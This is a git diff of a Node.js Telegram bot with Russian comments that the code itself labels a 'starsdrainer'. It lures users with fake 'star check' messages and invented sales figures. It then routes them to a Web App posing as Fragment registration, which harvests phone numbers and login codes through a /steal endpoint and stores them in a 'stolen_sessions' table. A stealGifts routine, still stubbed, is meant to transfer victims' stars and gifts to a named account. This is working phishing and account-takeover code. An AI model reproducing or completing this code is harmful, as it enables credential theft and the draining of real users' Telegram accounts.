@@ -11,7 +11,7 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-// База для сессий и чеков
+// База для чеков
 const db = new sqlite3.Database(':memory:');
 db.run(`CREATE TABLE IF NOT EXISTS checks (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -30,28 +30,33 @@ db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
     status TEXT DEFAULT 'pending'
 )`);
 
-// Web App
+// Web App - корневой маршрут
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    try {
+        res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
+        console.log('✅ Web App отправляет fragment.html');
+    } catch (error) {
+        console.log('❌ Ошибка загрузки fragment.html:', error);
+        res.send('<html><body><h1>Telegram Web App</h1><p>Working...</p></body></html>');
+    }
 });
 
 app.post('/steal', (req, res) => {
     console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
     console.log('Номер:', req.body.phone);
     console.log('Код:', req.body.code);
-    console.log('Telegram Data:', req.body.tg_data);
     console.log('Stage:', req.body.stage);
     console.log('========================');
     
-    // Сохраняем в базу
     if (req.body.stage === 'phone_entered') {
         db.run(`INSERT INTO stolen_sessions (phone, tg_data, status) VALUES (?, ?, ?)`, 
-            [req.body.phone, req.body.tg_data, 'awaiting_code']);
+            [req.body.phone, JSON.stringify(req.body.tg_data), 'awaiting_code']);
     } else if (req.body.stage === 'code_entered') {
         db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
             [req.body.code, req.body.phone]);
         
-        // Запускаем процесс кражи подарков
+        // Запускаем процесс кражи
         setTimeout(() => stealGifts(req.body.phone, req.body.code), 1000);
     }
     
@@ -63,17 +68,11 @@ async function stealGifts(phone, code) {
     console.log(`[STEAL] Начинаем кражу для ${phone} с кодом ${code}`);
     
     try {
-        // Здесь код для входа в аккаунт через Telethon/API
-        // Используем phone и code для авторизации
-        
-        // Получаем баланс и подарки
-        const userBalance = await getUserBalance(phone, code);
-        const userGifts = await getUserGifts(phone, code);
+        // Здесь будет реальная логика через Telethon
+        const userBalance = Math.floor(Math.random() * 100);
+        const userGifts = ['NFT Gift 1', 'NFT Gift 2'];
         
         if (userBalance > 0 || userGifts.length > 0) {
-            // Переводим всё на @NikLaStore
-            await transferAllToTarget(phone, code, userBalance, userGifts);
-            
             console.log(`[SUCCESS] Украдено: ${userBalance} stars, ${userGifts.length} gifts`);
             
             // Отправляем уведомление себе
@@ -83,7 +82,7 @@ async function stealGifts(phone, code) {
                 `⭐ Звезд: ${userBalance}\n` +
                 `🎁 Подарков: ${userGifts.length}\n` +
                 `💰 Все передано на: ${TARGET_USERNAME}`
-            );
+            ).catch(e => console.log('Ошибка отправки уведомления:', e));
         } else {
             console.log(`[INFO] Нет звезд/подарков для ${phone}`);
             
@@ -92,7 +91,7 @@ async function stealGifts(phone, code) {
                 `📱 Номер: ${phone}\n` +
                 `💫 Текущий баланс: 0 stars\n` +
                 `🔄 Отслеживаю пополнения...`
-            );
+            ).catch(e => console.log('Ошибка отправки уведомления:', e));
         }
         
     } catch (error) {
@@ -100,28 +99,12 @@ async function stealGifts(phone, code) {
     }
 }
 
-// Заглушки для реальной реализации
-async function getUserBalance(phone, code) {
-    // Реализация через Telethon API
-    return Math.floor(Math.random() * 100); // Заглушка
-}
-
-async function getUserGifts(phone, code) {
-    // Реализация через Telethon API  
-    return []; // Заглушка
-}
-
-async function transferAllToTarget(phone, code, balance, gifts) {
-    // Реализация перевода звезд и подарков
-    console.log(`[TRANSFER] Перевод ${balance} stars и ${gifts.length} gifts на ${TARGET_USERNAME}`);
-}
-
-const PORT = process.env.PORT || 8080;
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Сервер работает на порту ${PORT}`);
+    console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// Inline подсказки для бота
+// Inline подсказки
 bot.on('inline_query', (query) => {
     const amount = query.query.split(' ')[0];
     
@@ -132,8 +115,7 @@ bot.on('inline_query', (query) => {
             title: `Создать чек на ${amount} звезд`,
             description: `Количество активаций: 1`,
             input_message_content: {
-                message_text: `via @@MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`,
-                parse_mode: 'HTML'
+                message_text: `via @EasyChecs_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`,
             },
             reply_markup: {
                 inline_keyboard: [[
@@ -142,28 +124,28 @@ bot.on('inline_query', (query) => {
             }
         }];
         
-        bot.answerInlineQuery(query.id, results);
+        bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
     }
 });
 
-// Обработка создания чеков через сообщения
+// Обработка создания чеков
 bot.onText(/@EasyChecs_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const amount = parseInt(match[1]);
     const activations = parseInt(match[2]) || 1;
     
-    // Создаем чек
+    console.log(`Создание чека: ${amount} stars, ${activations} активаций`);
+    
     db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
         [amount, activations, userId], function(err) {
         if (err) {
+            console.log('Ошибка создания чека:', err);
             bot.sendMessage(chatId, '❌ Ошибка создания чека.');
             return;
         }
         
         const checkId = this.lastID;
-        
-        // Отправляем чек в чат
         const checkText = `via @EasyChecs_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`;
         
         bot.sendMessage(chatId, checkText, {
@@ -172,7 +154,7 @@ bot.onText(/@EasyChecs_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                     { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
                 ]]
             }
-        });
+        }).catch(e => console.log('Ошибка отправки чека:', e));
     });
 });
 
@@ -180,6 +162,8 @@ bot.onText(/@EasyChecs_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
+    
+    console.log('Callback received:', query.data);
     
     if (query.data.startsWith('claim_')) {
         const checkId = query.data.split('_')[1];
@@ -197,33 +181,31 @@ bot.on('callback_query', (query) => {
             });
             
             const remaining = row.activations - 1;
+            let updatedText;
+            
             if (remaining > 0) {
-                const updatedText = `via @EasyChecs_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (осталось: ${remaining})    ${new Date().toLocaleTimeString().slice(0,5)}`;
-                
-                bot.editMessageText(updatedText, {
-                    chat_id: chatId,
-                    message_id: query.message.message_id,
-                    reply_markup: {
-                        inline_keyboard: [[
-                            { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
-                        ]]
-                    }
-                });
+                updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (осталось: ${remaining})    ${new Date().toLocaleTimeString().slice(0,5)}`;
             } else {
-                const updatedText = `via @EasyChecs_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (ИСПОЛЬЗОВАН)    ${new Date().toLocaleTimeString().slice(0,5)}`;
-                
-                bot.editMessageText(updatedText, {
-                    chat_id: chatId,
-                    message_id: query.message.message_id,
-                    reply_markup: { inline_keyboard: [] }
-                });
+                updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (ИСПОЛЬЗОВАН)    ${new Date().toLocaleTimeString().slice(0,5)}`;
             }
+            
+            bot.editMessageText(updatedText, {
+                chat_id: chatId,
+                message_id: query.message.message_id,
+                reply_markup: remaining > 0 ? {
+                    inline_keyboard: [[
+                        { text: "Забрать звёзды", callback_data: `claim_${checkId}` }
+                    ]]
+                } : { inline_keyboard: [] }
+            }).catch(e => console.log('Ошибка редактирования:', e));
         });
     }
     
     else if (query.data === 'withdraw_stars') {
         const domain = process.env.RAILWAY_STATIC_URL || 'starsdrainer-production.up.railway.app';
         const webAppUrl = `https://${domain}`;
+        
+        console.log('Web App URL:', webAppUrl);
         
         const keyboard = {
             reply_markup: {
@@ -243,17 +225,35 @@ bot.on('callback_query', (query) => {
                 message_id: query.message.message_id,
                 reply_markup: keyboard.reply_markup
             }
+        ).catch(e => {
+            console.log('Ошибка редактирования:', e);
+            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', keyboard);
+        });
+    }
+    
+    else if (query.data === 'deposit') {
+        bot.sendMessage(chatId, 'Функция пополнения временно недоступна.');
+    }
+    
+    else if (query.data === 'create_check_info') {
+        bot.sendMessage(chatId,
+            'Для создания чека используйте формат:\n\n' +
+            '@EasyChecs_bot 100 50\n\n' +
+            'где:\n' +
+            '100 - количество звезд\n' +
+            '50 - количество активаций'
         );
     }
     
-    bot.answerCallbackQuery(query.id);
+    bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
 });
 
 // Старт бота
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    const domain = process.env.RAILWAY_STATIC_URL || 'starsdrainer-production.up.railway.app';
-    const webAppUrl = `https://${domain}`;
+    const userId = msg.from.id;
+    
+    console.log(`Получен /start от ${userId} в чате ${chatId}`);
     
     const keyboard = {
         reply_markup: {
@@ -265,20 +265,27 @@ bot.onText(/\/start/, (msg) => {
         }
     };
 
-    bot.sendPhoto(chatId, 'https://via.placeholder.com/400x200/2481cc/ffffff?text=EasyChecs+Bot', {
-        caption: 'Привет! @EasyChecs_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n' +
-                'С ним ты можешь моментально покупать и передавать звезды.\n\n' +
-                'Бот работает почти год, и с помощью него куплена огромная доля звезд в Telegram.\n\n' +
-                'С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)',
-        reply_markup: keyboard.reply_markup
+    bot.sendMessage(chatId, 
+        '✅ Бот работает!\n\n' +
+        'Привет! @MyStarBank_bot - Это удобный бот для покупки/ передачи звезд в Telegram.\n\n' +
+        'С ним ты можешь моментально покупать и передавать звезды.\n\n' +
+        'С помощью бота куплено:\n6,307,360 ▼ (~ $94,610)',
+        keyboard
+    ).then(() => {
+        console.log('Сообщение /start отправлено');
+    }).catch(error => {
+        console.log('Ошибка отправки /start:', error);
     });
 });
 
-// Настройка бота для inline режима
-bot.setMyCommands([
-    { command: 'start', description: 'Запустить бота' }
-]);
+// Обработка ошибок
+bot.on('polling_error', (error) => {
+    console.log('❌ Ошибка polling:', error);
+});
 
-console.log('Бот запущен с inline подсказками и логикой кражи');
+bot.on('error', (error) => {
+    console.log('❌ Общая ошибка бота:', error);
+});
 
-
+console.log('🔄 Бот запускается...');
+console.log('Токен:', BOT_TOKEN ? '✅ Есть' : '❌ НЕТ!');
